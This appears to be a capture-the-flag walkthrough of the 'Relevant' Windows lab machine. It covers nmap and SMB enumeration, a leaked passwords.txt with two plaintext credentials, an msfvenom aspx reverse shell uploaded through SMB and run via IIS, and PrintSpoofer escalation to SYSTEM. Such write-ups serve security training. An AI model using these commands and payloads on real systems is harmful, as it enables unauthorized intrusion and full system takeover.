# Relevant (Medium)

**—Penetration Testing Challenge—**

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days.

**Scope of Work**

—The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

- User.txt
- Root.txt

—Additionally, the client has provided the following scope allowances:

- *Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first*
- *Locate and note all vulnerabilities found*
- *Submit the flags discovered to the dashboard*
- *Only the IP address assigned to your machine is in scope*
- *Find and report ALL vulnerabilities (yes, there is more than one path to root)*

# Reconnaissance:

- Scan to gather information Machine:

```bash
nmap -sV -vv -A -T4 -p- <IP>
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  syn-ack ttl 127 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2024-06-28T10:04:40+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2024-06-28T10:04:01+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-27T10:00:13
| Not valid after:  2024-12-27T10:00:13
| MD5:   0c38:9a94:fb40:7986:04c1:7e7c:27aa:84b6
| SHA-1: 0809:960e:6be1:7b1d:3218:a02c:772b:47cb:0a6a:7b71
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQWqVEkAvm2p9IjApwrsEVqTANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yNDA2MjcxMDAwMTNaFw0yNDEyMjcxMDAw
| MTNaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAyUQ19x0SIQwtU3vLIOxdSQdI9u3Q8giIf1NF7lhB14dFG45jG1cm
| vBDeyMNz2Cdyjm+U6YhUqiEYBe9UR4gqLuzmSERK2Nn31zsBwaWkdRzlqyKflFpV
| FgEp152cqVuEzsh+GgpdSG3iwRwyz9DLGERCI2+UMY77ntHyxdkxLioP4uzm4z3c
| YfMNQvQxhS16l5/hHCvio+38ygOEdP/f8WjCQM4YnlEbQ0PM8b6zi8GE6Xq6c3EC
| Izi+m3fZjkykFi1arUFGsHbjEIBVq4ihows5RumC/1XwgqVaCp8BG5Z/7sU569Yq
| wxCoeLluOGmQJA+0dxM0NXjM1yqGQRgGAwIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAACFIF96+ktN
| 7CcimDF7CiI5PDSM6JUdYwR+hde4UpSGXdhtaoszkeV7n+lelZ0p8WAR0H1Hvpwe
| cj/7UMOa3L4y8K7Pux2tkgO9P3nfINw/tDssbdPTnD/4+A1acRf0VNNd5lu3ISXb
| 8J4Fx7c8fParbiVJzdDoTm1XpsD6dHVS12eIyXc8eNbsxzX7NGUJhzuCnYG/5+CM
| 8jlGkkQayD0yMN1KwvlobyQF4N92e7BiMxvSmoi0BrpWkt/VqMVcZSbd7D6ngWee
| y5CYlf2W61ACT27nCMUVp4jD276FRr5rPcv/4wcs+fTZekiMYgiIzCgAp6et0O55
| NWbaFE9Utbc=
|_-----END CERTIFICATE-----
49663/tcp open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=6/28%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=667E8AB9%P=x86_64-pc-linux-gnu)
SEQ(SP=FC%GCD=1%ISR=111%TI=I%II=I%SS=S%TS=A)
OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M508NW8ST11%O6=M508ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M508NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)
```

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.93.149
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-28 17:47 +07
Nmap scan report for 10.10.93.149
Host is up (0.23s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.93.149\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.93.149\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.93.149\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.93.149\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 66.45 seconds
```

- Not as usually, smb doesn’t have account Anonymous but we can see another account name “nt4wrksv” - Type: Disk so we can try login smbclient with this account.

```bash
smbclient //10.10.15.151/nt4wrksv
Password for [WORKGROUP\zicco]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 26 04:46:04 2020
  ..                                  D        0  Sun Jul 26 04:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 22:15:33 2020

		7735807 blocks of size 4096. 4936090 blocks available
smb: \> more passwords.txt 
getting file \passwords.txt of size 98 as /tmp/smbmore.ZMWI9W (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
smb: \> 
```

—> We got the password file .txt 

![Untitled](Untitled.png)

—> We had User and Passwords - encoded so now we decode to get the credential.

- We got 2 credentials :
- Bob - !P@$$W0rD!123
- Bill - Juw4nnaM4n420696969!$$$

# Exploit and Access Initial

- We try 2 credentials with smbmap and don’t have new information.

![Untitled](Untitled%201.png)

- So we try to next port :3389  —> RDP service
- We can exploit RDP by brute force to find the vuln but the result is still same —> Fail!
- Finally port:49663 —> IIS Windows Server this is a server Window. The third most popular web host in the world, behind only Apache and Nginx.
- Now we try to access SMB shares through IIS server port 49663 and go directly file passwords.txt in /nt4wrksv —> Success!!! We can read file passwords.txt

![Untitled](Untitled%202.png)

- We have idea that we will add the reverse shell and run the Path URL to catch the listen. After that we can gain access initial the web server.
- Firstly, we generate the shell by msfvenom and format we choose is .aspx ( This is extension design for framework [ASP.NET](http://ASP.NET)  so that will be stable with IIS server)

```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP-Machine> lport=1234 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3418 bytes
Saved as: shell.aspx
```

- Secondly, we will upload shell into SMB shares through uploading SMBclient `put shell.aspx`

![Untitled](Untitled%203.png)

- Finally, run Path URL with shell and catch the listen with netcat.

![Untitled](Untitled%204.png)

![Untitled](Untitled%205.png)

# Privilege Escalation

- View all priveleges

```bash
c:\Users\Bob\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

—> SeImpersonatePrivilege is Enabled so we can abuse it to escalate ‘Admin’.

- Let research some info about SeImpersonatePrivilege to find method to abuse it.
- We can check in link: https://github.com/gtworek/Priv2Admin

![Untitled](Untitled%206.png)

—> We use tool to escalate: PrintSpoofer.

![Untitled](Untitled%207.png)

- We got tool from GitHub
- We upload file PrintSpoofer.exe by `put PrintSpoofer.exe`  in SMBClient and now we check file in `c:\inetpub\wwwroot\nt4wrksv`  —> File is available.

```bash
c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

07/03/2024  05:26 AM    <DIR>          .
07/03/2024  05:26 AM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
07/03/2024  05:26 AM            27,136 PrintSpoofer.exe
07/03/2024  05:21 AM             3,418 shell.aspx
               3 File(s)         30,652 bytes
               2 Dir(s)  20,278,337,536 bytes free
```

- Run file PrintSpoofer.exe and we got ‘Admin’

```bash
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

![Untitled](Untitled%208.png)

END!!!